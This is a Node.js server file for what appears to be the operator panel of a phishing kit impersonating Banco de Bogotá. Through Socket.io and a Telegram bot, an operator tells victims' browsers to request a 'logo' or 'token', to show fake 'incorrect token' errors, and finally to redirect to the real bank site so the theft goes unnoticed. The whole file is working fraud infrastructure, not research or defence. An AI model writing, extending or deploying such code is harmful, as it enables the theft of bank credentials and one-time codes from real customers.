const express = require('express');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// Configuración inicial
const app = express();
const token = process.env.TELEGRAM_TOKEN;
const chatId = process.env.TELEGRAM_CHAT_ID;

// Configuración de Socket.io
const io = new Server({
    cors: {
        origin: process.env.VERCEL === '1' 
            ? 'https://panel-de-bogota.vercel.app' 
            : '*',
        methods: ["GET", "POST"],
        credentials: true
    },
    path: '/socket.io'
});

// Configurar el bot de Telegram
const bot = new TelegramBot(token, {
    webHook: process.env.VERCEL === '1'
});

// Configuración de Express
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// Configuración del bot
async function setupBot() {
    try {
        if (process.env.VERCEL === '1') {
            const webhookUrl = 'https://panel-de-bogota.vercel.app/api/webhook';
            await bot.setWebHook(webhookUrl);
            console.log('Webhook configurado:', webhookUrl);
        } else {
            await bot.setWebHook('');
            console.log('Usando polling para desarrollo local');
        }
    } catch (error) {
        console.error('Error al configurar bot:', error);
    }
}

// Socket.io connection handler
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);

    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
    });

    socket.on('process_action', async (data) => {
        try {
            const { action, messageId } = data;
            console.log(`Procesando acción ${action} para mensaje ${messageId}`);
            
            let redirectUrl, message;
            switch (action) {
                case 'error_logo':
                    redirectUrl = '/index.html?action=error_logo';
                    message = 'Por favor verifique su logo e intente nuevamente.';
                    break;
                case 'pedir_logo':
                    redirectUrl = '/index.html?action=pedir_logo';
                    break;
                case 'error_token':
                    redirectUrl = '/token.html?action=error_token';
                    message = 'Token incorrecto. Por favor intente nuevamente.';
                    break;
                case 'pedir_token':
                    redirectUrl = '/token.html?action=pedir_token';
                    break;
                case 'finalizar':
                    redirectUrl = 'https://virtual.bancodebogota.co/';
                    message = 'Proceso finalizado exitosamente';
                    await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: { inline_keyboard: [] }
                    });
                    break;
            }

            socket.emit('telegram_action', {
                action,
                messageId,
                redirect: redirectUrl,
                message
            });
        } catch (error) {
            console.error('Error al procesar acción:', error);
            socket.emit('error', { message: 'Error al procesar la acción' });
        }
    });
});

// Configurar rutas
app.post('/api/webhook', (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Inicializar
setupBot().catch(console.error);

// Exportar para Vercel
module.exports = app;